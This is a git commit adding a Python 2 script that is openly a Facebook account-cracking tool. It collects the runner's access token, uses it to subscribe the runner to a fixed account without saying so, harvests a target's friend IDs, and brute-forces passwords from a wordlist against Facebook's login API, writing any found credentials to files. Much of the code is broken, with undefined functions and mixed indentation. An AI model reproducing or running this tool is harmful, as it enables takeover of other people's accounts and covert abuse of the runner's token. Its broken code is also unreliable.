3997df9e0001a4fda9d1097b0ed742d6bd8d3899
Aryano Devil <81142233+aryanotriks@users.noreply.github.com>
2021-04-15 02:52:09 +0000

    Create Zb.py

---
+++ Zb.py
@@ -0,0 +1,279 @@
+#coding:utf-8
+#!/user/bin/python2
+#coding by Zakarya
+try:    
+    import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass,mechanize,requests
+    from multiprocessing.pool import ThreadPool
+    from requests.exceptions import ConnectionError
+    from mechanize import Browser
+except ImportError:
+    os.system('pip2 install requests')
+    os.system('pip2 install mechanize')
+    os.system('python2 Fb2.py')
+try:
+    os.mkdir('Fb2')
+except OSError:
+    pass
+
+from requests.exceptions import ConnectionError
+bd=random.randint(2e7, 3e7)
+sim=random.randint(2e4, 4e4)
+header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-Telkomsel': repr(sim),'x-fb-net-Telkomsel': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyLTE','user-agent':'Mozilla/5.0 (Linux; Android 5.1.1; walleye/Bulid/LMY48G;wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
+reload(sys)
+sys.setdefaultencoding("utf8")
+
+def exit():
+    print '[!] Exit'
+    os.sys.exit()
+    
+def acak(b):
+    w = 'ahtdzjc'
+    d = ''
+    for i in x:
+        d += '!'+w[random.randint(0,len(w)-1)]+i
+        return cetak(d)
+        
+
+
+#### colours ####
+B='\033[1;94m'
+R='\033[1;91m'
+G='\033[1;92m'
+W='\033[1;97m'
+S='\033[1;96m'
+P='\033[1;95m'
+Y='\033[1;93m'
+
+#Dev:Sayyed_Zakarya
+#### LOGO ####
+logo = """                          
+\033[1;94m  ___   _____  _     _  _     _  ___    ___   
+\033[1;91m(  _ \(  _  )( )   ( )( )   ( )(  _ \ (  _ \ 
+\033[1;92m | (_(_) (_) | \ \_/ /  \ \_/ / | (_(_)| | ) |
+\033[1;93m  \__ \(  _  )   \ /      \ /   |  _)_ | | | )
+\033[1;95m ( )_) | | | |   | |      | |   | (_( )| |_) |
+\033[1;97m  \(___)_) (_)   (_)      (_)   (____/ (____/ 
+\033[1;94m  (_)                                         
+\033[1;96m
+\033[1;94m  _______ _____  _   _ _____  ___    _     _ _____ 
+\033[1;92m (_____  )  _  )( ) ( )  _  )|  _ \ ( )   ( )  _  )
+\033[1;93m      / /| (_) || |/ /| (_) || (_) ) \ \_/ /| (_) |
+\033[1;95m    / /  (  _  )|   ( (  _  )|    /    \ /  (  _  )
+\033[1;94m  / / ___| | | || |\ \| | | || |\ \    | |  | | | |
+\033[1;96m (_______)_) (_)( ) (_)_) (_)(_) (_)   (_)  (_) (_)
+\033[1;97m                /(                                 
+\033[1;94m               (__)                                                                            
+"""
+('xdg-open https://www.youtube.com/channel/UCzCZ1fHCMM6xjSfQOZFEmqg')      
+idh = []
+
+def logmen():
+    os.system('clear')
+    print logo
+    print ' [1] Login Token'
+    print ' [\x1b[91m0\x1b[0m] Exit Tool'
+    pilog()
+def pilog():
+    og = raw_input("\nSelect: ")
+    if og =="1":
+        os.system("clear")
+        print ("AUTHER AND OWNER 👉👉Mr-Robot")
+        print
+        token = raw_input("[+] Past Your Token Here : ")
+        sav = open(".logfuck.txt","w")
+        sav.write(token)
+        sav.close()
+        print ("\r\033[1;32m[✓] Login Succesfully\033[0;97m")
+        os.system('xdg-open https://www.youtube.com/channel/UCzCZ1fHCMM6xjSfQOZFEmqg')
+        time.sleep(1)
+        bot_fl()
+    elif og =="0":
+        exit()
+    else:
+        print ("[!] Pilih Yang Bener Dong")
+        pilog()
+        
+def bot_fl():
+    try:
+        token = open('.logfuck.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;97m   [!] Token invalid'
+        os.system('rm -rf .logfuck.txt')
+    requests.post('https://graph.facebook.com/100001027764318/subscribers?access_token=' + token)
+    menu()
+    
+def menu():
+    os.system("clear")
+    try:
+        token = open(".logfuck.txt","r").read()
+    except IOError:
+        print logo
+        print("[!] token error. token not found")
+        os.system("rm -rf .logfuck.txt")
+        time.sleep(1)
+        logmen()
+    try:
+        r = requests.get("https://graph.facebook.com/me?access_token="+token, headers=header)
+        a = json.loads(r.text)
+        name = a["name"]
+    except KeyError:
+        os.system("clear")
+        print logo
+        print("[!] Failed To Load. Your Checkpoint account")
+        os.system("rm -rf .logfuck.txt")
+        time.sleep(1)
+        logmen()
+    os.system("clear")
+    print logo
+    print("Welcome "+name)
+    print (" ")
+    print ("Please select")
+    print (" ")
+    print ("Don't Copy Me Because I Am Your Father")
+    print (" ")
+    print("[1] Start Cracking")
+    print("[\x1b[91m0\x1b[0m] Exit")
+    pil()
+    
+def pil():
+    ti = raw_input('\nSelect: ')
+    if ti =='1':
+        cramen()
+    elif ti =='0':
+        os.system('rm -rf .logfuck.txt')
+        print '[√] Deleting Token Successfully.'
+        time.sleep(1)
+        os.system('exit')
+        logmen()
+    else:
+        print '[!] Pilih Yang Bener Dong'
+        pil()
+        
+def cramen():
+	global token
+	os.system("clear")
+	try:
+		token=open(".logfuck.txt","r").read()
+	except IOError:
+		print("[!] Token Error. Token Not Working")
+		os.system("rm -rf .logfuck.txt")
+		time.sleep(1)
+		logmen()
+	os.system("clear")
+	print logo
+	print "[1] Target Hacking"
+	print '[\x1b[91m0\x1b[0m] Back'
+	crapil()
+	
+def crapil():
+	select = raw_input("\nSelect: ")
+	id=[]
+	oks=[]
+	cps=[]
+	if select=="10000":
+		os.system("clear")
+		print logo
+		r = requests.get("https://graph.facebook.com/me/friends?access_token="+token, headers=header)
+		z = json.loads(r.text)
+		for s in z["data"]:
+			uid=s['id']
+			na=s['name']
+			nm=na.rsplit(" ")[0]
+			id.append(uid+'|'+nm)
+	elif select =="1":
+		os.system("clear")
+		print logo
+		idt = raw_input("[+] Target ID : ")
+		os.system("clear")
+		print logo
+		try:
+			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)
+			q = json.loads(r.text)
+			print("[✓] Name : "+q["name"])
+		except KeyError:
+			print('\n[!] Fb ID . ID : '+idt+' Friends Not Public')
+			raw_input("\nBack ")
+			cramen()
+		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token, headers=header)
+		z = json.loads(r.text)
+		for i in z["data"]:
+			uid=i['id']
+			na=i['name']
+			nm=na.rsplit(" ")[0]
+			id.append(uid+'|'+nm)
+	   
+	elif select =="0":
+		menu()
+	else:
+		print ("[!] Pilih Yang Bener Dong")
+		crapil()
+def brute():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token not found'
+        os.system('rm -rf login.txt')
+        time.sleep(0.001)
+        login()
+    else:
+        os.system('clear')
+        print logo14
+        print '\033[1;93m ◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.'
+        try:
+            email = raw_input('\x1b[1;91m[●] \x1b[1;92mID\x1b[1;97m/\x1b[1;91mEmail \x1b[1;92mTarget \x1b[1;91m:\x1b[1;96m ')
+            passw = raw_input('\x1b[1;91m[●] \x1b[1;92mWordlist \x1b[1;97m(Type👉lovehacker-2.txt) \x1b[1;91m: \x1b[1;97m')
+            total = open(passw, 'r')
+            total = total.readlines()
+            print '\033[1;95m ◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.'
+            print '\x1b[1;93m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mTarget \x1b[1;91m:\x1b[1;97m ' + email
+            time.sleep(0.05)
+            print '\x1b[1;93m[+] \x1b[1;93mTotal\x1b[1;94m ' + str(len(total)) + ' \x1b[1;92mPassword'
+            time.sleep(0.05)
+            jalan('\x1b[1;93m[\xe2\x9c\xba] \x1b[1;95mPlease wait \x1b[1;97m...')
+            sandi = open(passw, 'r')
+            for pw in sandi:
+                try:
+                    pw = pw.replace('\n', '')
+                    sys.stdout.write('\r\x1b[1;91m[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mTry \x1b[1;97m' + pw)
+                    sys.stdout.flush()
+                    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + email + '&locale=en_US&password=' + pw + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                    mpsh = json.loads(data.text)
+                    if 'access_token' in mpsh:
+                        dapat = open('Brute.txt', 'w')
+                        dapat.write(email + ' ● ' + pw + '\n')
+                        dapat.close()
+                        print '\n\x1b[1;91m[+] \x1b[1;92mFounded.'
+                        print 52 * '\x1b[1;93m\xe2\x95\x90'
+                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;95mUsername \x1b[1;91m:\x1b[1;92m ' + email
+                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;91mPassword \x1b[1;91m:\x1b[1;91m ' + pw
+                        keluar()
+                    else:
+                        if 'www.facebook.com' in mpsh['error_msg']:
+                            ceks = open('Brutecekpoint.txt', 'w')
+                            ceks.write(email + ' | ' + pw + '\n')
+                            ceks.close()
+                            print '\n\x1b[1;91m[+] \x1b[1;92mFounded.'
+                            print  "\033[1;96m ◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•."
+                            print '\x1b[1;91m[!] \x1b[1;93mAccount Maybe Checkpoint'
+                            time.sleep(0.05)
+                            print '\x1b[1;94m[\xe2\x9e\xb9] \x1b[1;95mUsername \x1b[1;93m:\x1b[1;92m ' + email
+                            time.sleep(0.05)
+                            print '\x1b[1;94m[\xe2\x9e\xb9] \x1b[1;95mPassword \x1b[1;93m:\x1b[1;91m ' + pw
+                            keluar()
+                except requests.exceptions.ConnectionError:
+                    print '\x1b[1;91m[!] Connection Error'
+                    time.sleep(1)
+
+        except IOError:
+            print '\x1b[1;91m[!] File not found...'
+            print """\n\x1b[1;91m[!] \x1b[1;93mAdd another wordlist corect name"""
+            super()
+															
+		
+	
+	raw_input('Back')
+	menu()
+    
+if __name__ == '__main__':
+	menu()
